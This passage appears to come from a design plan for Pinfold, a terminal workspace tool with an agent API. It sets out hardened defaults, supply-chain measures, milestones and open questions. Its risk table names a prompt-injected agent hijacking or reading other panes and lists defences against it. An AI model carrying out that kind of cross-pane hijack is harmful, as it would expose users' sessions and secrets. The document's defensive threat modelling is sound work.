**File manager.** Filenames with control characters, newlines or bidi override characters (Trojan Source) are shown escaped and flagged in red. Opening a file never executes it. Executables, scripts and `.desktop` / `.app` bundles open in the pager unless you choose "run" and confirm. Delete moves to the trash, and bulk operations show the full list before running.

**Git diff viewer.** Running git inside an untrusted repo can execute code through repo config. Pinfold always runs git as `git --no-pager -c core.fsmonitor=false -c core.hooksPath=/dev/null diff --no-ext-diff --no-textconv`, with `GIT_TERMINAL_PROMPT=0`, and respects `safe.directory`. Paths in diffs are sanitized like filenames. Stage and revert need a key press and are never exposed to agents without the `children` or a granted scope.

**Workspace trust.** A repo's `.pinfold/layout.toml` is untrusted, like a `.envrc` under direnv. The first `pinfold up` shows every command the layout would run and asks whether to trust it. Trust is stored by the file's SHA-256 hash, so any change asks again. Repos can never supply agent profiles, key bindings, hooks or alert destinations; those come only from your own config.

**Config file integrity.** Pinfold refuses to load `pinfold.toml`, hooks or plugin manifests that are writable by group or others, or not owned by you, the same rule ssh uses for its config.

### Data at rest and network egress

- **Snapshots** hold layout, cwd and commands, not screen contents, by default. Saving scrollback is opt-in per session. When it is on, scrollback passes the redaction filter first, and files are written 0600 into a 0700 directory.
- **Environment variables** are never saved, except names on an allowlist (`PATH`, `LANG`, `TERM`, `VIRTUAL_ENV` and similar). Values that look like secrets are dropped even if their name is on the allowlist.
- **Spill files** for cold scrollback are opened and unlinked at once, so they have no path on disk. They are encrypted with ChaCha20-Poly1305 under a random key kept only in RAM, so a crash or a stolen disk leaves nothing readable. The cost is about 1 KB of code state and under 1% CPU.
- **Restore never re-runs** arbitrary commands. Only agent resume commands from your own profiles, and commands on your `auto_rerun` allowlist, run without a key press.
- **Webhooks and ntfy** send only pane name, status and time, never output text. URLs must be `https`, are set only in the config file, and are never changeable over the API. Pinfold makes no other network connections: no telemetry and no update checks unless you turn them on.

### Supply chain and secure development

- `#![forbid(unsafe_code)]` in every crate except one small `pinfold-sys` crate for FFI and `libc` calls. Every `unsafe` block there needs a review and a `// SAFETY:` comment.
- Continuous fuzzing with `cargo-fuzz` of the VT parser input path, the JSON-RPC decoder, the markdown renderer, the unified diff parser and the paste sanitizer. A crash or a memory budget overrun found by the fuzzer is a release blocker.
- Dependency policy: `cargo-deny` (licences, banned crates, duplicate versions), `cargo-audit` on every build, `cargo-vet` audits for new crates, and a lockfile committed and reviewed. Each new dependency must justify both its security and its memory cost.
- Releases are reproducible builds, signed with Sigstore (cosign), and published with an SBOM. On macOS they are code-signed with the hardened runtime and notarized.
- A `SECURITY.md` with a private reporting address and a 90-day disclosure policy. Security fixes get patch releases, not "next version".

### Secure defaults at a glance

| Setting                                             | Default                                   | Who can change it             |
| --------------------------------------------------- | ----------------------------------------- | ----------------------------- |
| Agent access to other panes                         | Ask each time                             | You, per session or in config |
| Writes to SSH, sudo, root and password-prompt panes | Blocked                                   | You, one call at a time       |
| Redaction of cross-pane reads                       | On                                        | Config only                   |
| Clipboard read by programs (OSC 52)                 | Off                                       | Config only                   |
| Scrollback in snapshots                             | Off                                       | Config, per session           |
| Network listeners                                   | None                                      | Not available in v1           |
| Webhook content                                     | Status only                               | Not changeable                |
| Repo layouts                                        | Ask before first run, and again on change | You                           |

### Security work per milestone

| Milestone  | Security deliverables                                                                          |
| ---------- | ---------------------------------------------------------------------------------------------- |
| M0         | `forbid(unsafe_code)`, `cargo-deny` and `cargo-audit` in CI, this threat model reviewed        |
| M1         | Escape-sequence policy, paste sanitizer, fuzzing of the VT input path                          |
| M2         | Socket directory checks, peer UID check, owner token                                           |
| M3         | Capability tokens, scopes, approval prompt, protected panes, redaction, audit log, API fuzzing |
| M4         | Filename and markdown sanitizing, hardened git invocation, tool size and time caps             |
| M5         | Workspace trust, encrypted spill files, snapshot redaction, signed and notarized releases      |
| Before 1.0 | External penetration test focused on the agent API and escape-sequence handling                |

## Risks and open questions

| Risk                                                                        | Impact                                                              | Mitigation                                                                                                   |
| --------------------------------------------------------------------------- | ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| Font rendering and IME differ on each OS                                    | Blurry text, broken CJK input                                       | Use `crossfont` and winit IME as Alacritty does; test on Linux (X11 and Wayland) and macOS from M1           |
| CPU drawing is slower for full-screen redraws on 4K or high-refresh screens | Dropped frames when scrolling fast; a 33 MB pixel buffer at 4K      | Redraw damaged rows only; SIMD blending; switch to the optional OpenGL renderer above a size threshold       |
| "Waiting for input" detection is heuristic                                  | Missed or false alerts                                              | Prefer hooks and OSC signals; profile regexes are only a fallback; per-agent tests against recorded sessions |
| Linux display servers differ (Wayland vs X11)                               | Clipboard, IME and window decorations behave differently on Wayland | Test on GNOME and KDE (Wayland) and on X11; use winit's client-side decorations                              |
| `alacritty_terminal` API changes between versions                           | Upgrade churn                                                       | Pin the version; keep all access behind the `VtEngine` trait                                                 |
| Scope creep (it is three products in one)                                   | Never ships                                                         | Strict milestones; tools are optional crates; v1 non-goals listed above                                      |
| A prompt-injected agent drives or reads other panes                         | Pane hijacking                                                      | Scoped tokens, approval prompts, protected panes, redaction, audit log (see Security design)                 |

**macOS notes.** The default CPU renderer hands frames to macOS through CoreGraphics, so Apple's deprecation of OpenGL affects only the optional GPU renderer. Pinfold keeps all drawing behind a `Renderer` trait so that a Metal backend can be added if Apple ever removes OpenGL. On macOS, config and state live in `~/Library/Application Support/pinfold`, and on Linux they follow XDG. Windows support is planned for after v1.

**Open questions for you**

- [ ] Decided: v1 targets Linux and macOS. Windows comes after v1.
- [ ] Are inline images needed (md images, image previews in the file manager)? That would push the engine toward `libghostty-vt` or our own Kitty graphics layer.
- [ ] Should the daemon accept remote connections (attach over SSH) in a later version?
- [ ] Decided: the name is Pinfold, at pinfold.sh.

* [ ] Security: should a trusted project layout be able to pre-approve cross-pane scopes (for example, an orchestrator agent that drives a test pane), or must every grant be interactive?
* [ ] Security: redaction will sometimes hide strings an agent legitimately needs. Is a per-pane "show secrets to agents" switch acceptable, or should redaction never be bypassable?

## Sources

- [Foot terminal: lightweight, CPU-rendered, made for Wayland](https://linuxiac.com/?p=195327)
- [Windows Terminal issue #16983: high memory with hardware rendering](https://github.com/microsoft/terminal/issues/16983)
- [Mesa bug 65342: memory used per legacy GL context](https://bugs.freedesktop.org/show_bug.cgi?id=65342)
- [Linux terminal emulator statistics (memory figures)](https://commandlinux.com/statistics/linux-terminal-emulator-popularity/)
- [Linux terminal emulators in 2026: Alacritty, Kitty, WezTerm](https://dasroot.net/posts/2026/03/linux-terminal-emulators-alacritty-kitty-wezterm/)
- [Linux terminal emulator shootout 2026](https://linuxjunkies.org/guides/terminal-emulator-shootout)
- [Ghostty README: libghostty and architecture](https://github.com/chawyehsu/ghostty)
- [Mitchell Hashimoto, "Libghostty Is Coming"](https://mitchellh.com/writing/libghostty-is-coming)
- [alacritty_terminal on docs.rs](https://docs.rs/crate/alacritty_terminal/latest/source/)
- [portable-pty on docs.rs](https://docs.rs/crate/portable-pty/latest)
- [Rio terminal](https://sourceforge.net/p/rio/)
- [tacterm 0.1.0 release notes (GPU memory reductions)](https://github.com/narma/tacterm/releases)
